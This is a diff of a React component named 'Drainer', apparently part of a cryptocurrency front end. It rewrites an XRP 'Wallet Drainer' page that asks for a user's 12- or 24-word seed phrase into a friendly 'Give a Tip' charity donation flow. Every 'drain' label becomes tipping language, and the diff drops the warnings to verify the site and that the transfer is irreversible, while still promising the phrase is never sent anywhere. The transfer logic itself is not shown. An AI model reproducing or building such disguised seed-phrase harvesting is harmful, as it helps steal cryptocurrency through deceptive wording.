@@ -106,12 +106,12 @@ const Drainer: React.FC = () => {
                 />
                 <h1 className="text-4xl md:text-5xl font-bold tracking-tight text-slate-900 mb-2">
                     <span className="inline-flex items-center gap-3">
-                        Wallet Drainer
-                        <Zap className="w-10 h-10 text-orange-500" />
+                        Give a Tip
+                        <Gift className="w-10 h-10 text-orange-500" />
                     </span>
                 </h1>
                 <p className="text-slate-600 text-lg max-w-xl">
-                    Clean up dormant wallets in seconds. Donate leftover funds to environmental causes.
+                    Reclaim unused XRP from old wallets and donate it to the environmental organization of your choice.
                 </p>
             </motion.div>
 
@@ -129,9 +129,9 @@ const Drainer: React.FC = () => {
                                 <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-orange-100 flex items-center justify-center">
                                     <Key className="w-8 h-8 text-orange-500" />
                                 </div>
-                                <h2 className="text-2xl font-bold text-slate-900 mb-2">Enter Your Seed Phrase</h2>
+                                <h2 className="text-2xl font-bold text-slate-900 mb-2">Find Your Old Wallets</h2>
                                 <p className="text-slate-600">
-                                    We'll scan all wallets derived from your seed to find dormant funds.
+                                    Enter your recovery phrase to discover wallets with unused XRP that you can donate.
                                 </p>
                             </div>
 
@@ -139,11 +139,11 @@ const Drainer: React.FC = () => {
                                 <div className="relative">
                                     <textarea
                                         value={seedPhrase}
-                                        onChange={(e) => {
+                                         onChange={(e) => {
                                             setSeedPhrase(e.target.value);
                                             setSeedError('');
                                         }}
-                                        placeholder="Enter your 12 or 24 word seed phrase..."
+                                        placeholder="Enter your 12 or 24 word recovery phrase..."
                                         rows={4}
                                         className={`w-full px-4 py-3 bg-slate-50 border rounded-xl text-slate-900 placeholder:text-slate-400 focus:outline-none focus:ring-2 transition-all resize-none font-mono text-sm ${seedError
                                             ? 'border-red-300 focus:ring-red-500/30 focus:border-red-500'
@@ -175,7 +175,7 @@ const Drainer: React.FC = () => {
                                     <div className="flex items-start gap-3">
                                         <ShieldAlert className="w-5 h-5 text-amber-500 flex-shrink-0 mt-0.5" />
                                         <div className="text-sm text-amber-800">
-                                            <span className="font-semibold">Security Notice:</span> Your seed phrase is processed locally and never stored or transmitted. Always verify you're on the correct website.
+                                            <span className="font-semibold">Privacy First:</span> Your recovery phrase is processed locally and never stored or sent anywhere.
                                         </div>
                                     </div>
                                 </div>
@@ -193,8 +193,8 @@ const Drainer: React.FC = () => {
                                     </>
                                 ) : (
                                     <>
-                                        <Zap className="w-5 h-5" />
-                                        Scan for Wallets
+                                        <Sparkles className="w-5 h-5" />
+                                        Find Old Wallets
                                         <ChevronRight className="w-5 h-5" />
                                     </>
                                 )}
@@ -302,8 +302,8 @@ const Drainer: React.FC = () => {
                                 disabled={selectedWallets.length === 0}
                                 className="flex items-center gap-2 px-6 py-3 bg-orange-500 hover:bg-orange-400 disabled:bg-slate-200 disabled:text-slate-400 text-white font-semibold rounded-xl transition-all shadow-lg shadow-orange-500/20 disabled:shadow-none"
                             >
-                                <Trash2 className="w-5 h-5" />
-                                Drain Selected
+                                <Gift className="w-5 h-5" />
+                                Donate Selected
                                 <ChevronRight className="w-5 h-5" />
                             </button>
                         </motion.div>
@@ -323,15 +323,15 @@ const Drainer: React.FC = () => {
                                 <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-orange-100 flex items-center justify-center">
                                     <Gift className="w-8 h-8 text-orange-500" />
                                 </div>
-                                <h2 className="text-2xl font-bold text-slate-900 mb-2">Confirm Donation</h2>
+                                <h2 className="text-2xl font-bold text-slate-900 mb-2">Choose Your Organization</h2>
                                 <p className="text-slate-600">
-                                    You're about to donate <span className="font-semibold text-orange-600">{totalXRP.toFixed(2)} XRP</span> (≈${totalUSD.toFixed(2)})
+                                    Your tip of <span className="font-semibold text-orange-600">{totalXRP.toFixed(2)} XRP</span> (≈${totalUSD.toFixed(2)}) will support their environmental mission.
                                 </p>
                             </div>
 
                             <div className="space-y-4 mb-8">
                                 <label className="block text-sm font-medium text-slate-700 mb-2">
-                                    Choose an association to support
+                                    Select an organization to receive your tip
                                 </label>
                                 <div className="grid gap-3">
                                     {ASSOCIATIONS.slice(0, 4).map(association => (
@@ -366,7 +366,7 @@ const Drainer: React.FC = () => {
                                 <div className="flex items-start gap-3">
                                     <AlertCircle className="w-5 h-5 text-amber-500 flex-shrink-0 mt-0.5" />
                                     <div className="text-sm text-amber-800">
-                                        <span className="font-semibold">This action is irreversible.</span> The funds will be transferred to the selected association's wallet.
+                                        <span className="font-semibold">One-time donation.</span> Your tip will be sent directly to the organization's verified wallet.
                                     </div>
                                 </div>
                             </div>
@@ -394,8 +394,8 @@ const Drainer: React.FC = () => {
                                         </>
                                     ) : (
                                         <>
-                                            <Zap className="w-5 h-5" />
-                                            Confirm & Drain
+                                            <Gift className="w-5 h-5" />
+                                            Send My Tip
                                         </>
                                     )}
                                 </button>
@@ -433,7 +433,7 @@ const Drainer: React.FC = () => {
                             transition={{ delay: 0.4 }}
                             className="text-3xl font-bold text-slate-900 mb-3"
                         >
-                            Successfully Drained!
+                            Thank You for Your Tip!
                         </motion.h2>
 
                         <motion.p
@@ -442,7 +442,7 @@ const Drainer: React.FC = () => {
                             transition={{ delay: 0.5 }}
                             className="text-slate-600 mb-2"
                         >
-                            You've donated <span className="font-semibold text-green-600">{totalXRP.toFixed(2)} XRP</span> to support environmental causes.
+                            You've donated <span className="font-semibold text-green-600">{totalXRP.toFixed(2)} XRP</span> to help protect our planet.
                         </motion.p>
 
                         <motion.p
@@ -464,8 +464,8 @@ const Drainer: React.FC = () => {
                                 onClick={reset}
                                 className="flex items-center gap-2 px-6 py-3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold rounded-xl transition-all"
                             >
-                                <ArrowRight className="w-5 h-5" />
-                                Drain More
+                                <Gift className="w-5 h-5" />
+                                Give Another Tip
                             </button>
                         </motion.div>
                     </motion.div>
